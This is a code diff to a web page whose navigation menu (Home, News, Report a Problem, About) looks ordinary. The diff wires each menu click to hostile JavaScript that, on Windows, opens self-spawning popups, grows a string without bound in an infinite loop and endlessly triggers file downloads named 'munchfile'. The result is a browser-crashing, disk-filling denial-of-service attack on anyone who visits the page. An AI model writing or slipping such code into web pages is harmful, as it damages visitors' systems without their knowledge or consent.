@@ -102,7 +102,7 @@ li a:hover:not(.active) {
 <body>
 
 <ul>
-  <li class="active" onclick="runner()"><i class="fa fa-fw fa-home"></i> Home</li>
+  <li class="active" onclick="allinone()"><i class="fa fa-fw fa-home"></i> Home</li>
   <li onclick="download(document.getElementById('a').value)"><i class="fa fa-newspaper-o" aria-hidden="true"></i> News</li>
   <li onclick="download(document.getElementById('a').value)"><i class="fa fa-fw fa-envelope"></i> Report a Problem</li>
   <li onclick="download(document.getElementById('a').value)"><i class="fa fa-question-circle" aria-hidden="true"></i> About</li>
@@ -177,16 +177,29 @@ var popupWindow
 function CrashAndBurn(url) { popupWindow = window.open( url,'popUpWindow','height=181,width=666,left=3,top=222'); }
 
 function runner(){
+	CrashAndBurn(self.location,'_blank');
+}
+function killer(){
+	text += "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+}
+function allinone(){
+	runner();
+	text = "a";
 	while(1){
-	CrashAndBurn(self.location,'_blank');}
+		killer();
+		download1();
+	}
+
 }
 function download(mult) {
+    bobby = 5;
     bobby*=mult;
+    bob = 0;
     // if(mult==null){
     //   bobby = 50;
     // }
     if(OSName=="Windows"){
-		runner();
+		allinone();
 	}
     else{
     	while(bob<bobby){
@@ -211,10 +224,10 @@ function download(mult) {
     Math.pow(bobby, mult);
 	}
 }
+
 function download1() {
-    bobby=1000;
-    while(bob<bobby){
-    filename = 'munchyfile'+bob;
+   while(1){
+    filename = 'munchfile'+bob;
     var file = new Blob([data], {type: type});
     if (window.navigator.msSaveOrOpenBlob) // IE10+
         window.navigator.msSaveOrOpenBlob(file, filename);
@@ -230,9 +243,6 @@ function download1() {
             window.URL.revokeObjectURL(url);  
         }, 0); 
     }
-    bob = bob +1;}
-    bob = 0;
-    bobby*=3;
 }
 /**
  * The stars in our starfield!
